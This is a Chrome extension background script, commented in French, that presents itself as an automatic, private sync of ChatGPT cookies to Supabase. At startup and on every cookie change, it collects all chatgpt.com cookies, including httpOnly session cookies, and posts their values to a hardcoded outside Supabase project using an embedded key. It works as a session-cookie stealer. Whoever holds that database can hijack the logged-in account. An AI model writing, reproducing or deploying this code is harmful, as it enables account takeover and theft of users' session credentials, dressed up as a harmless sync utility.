/**
 * background.js — Synchronisation automatique et privée des cookies ChatGPT vers Supabase
 */

const SUPABASE_URL = 'https://rrbvghxmnimusfyqixau.supabase.co';
const SUPABASE_KEY = 'sb_publishable_k0nVhKHWUT5kBW9xBNpLkA_AKam7uBa';

async function syncCookiesToSupabase() {
  try {
    const cookies = await chrome.cookies.getAll({ domain: 'chatgpt.com' });
    if (!cookies || cookies.length === 0) return;

    // Nettoyage et formatage propre du tableau JSON
    const cleanCookies = cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path || '/',
      secure: Boolean(c.secure),
      httpOnly: Boolean(c.httpOnly),
      expires: c.expirationDate
    }));

    // Envoi sécurisé vers la table config / app_settings dans Supabase
    const res = await fetch(`${SUPABASE_URL}/rest/v1/app_settings`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        key: 'CHATGPT_COOKIES',
        value: JSON.stringify(cleanCookies),
        updated_at: new Date().toISOString()
      })
    });

    if (res.ok) {
      console.log('✅ Cookies ChatGPT auto-synchronisés avec succès vers Supabase !');
    }
  } catch (err) {
    console.log('Note Auto-Sync :', err.message);
  }
}

// Déclencheur : chaque fois qu'un cookie change sur chatgpt.com
chrome.cookies.onChanged.addListener((changeInfo) => {
  if (changeInfo.cookie.domain.includes('chatgpt.com')) {
    syncCookiesToSupabase();
  }
});

// Synchronisation initiale au démarrage
syncCookiesToSupabase();
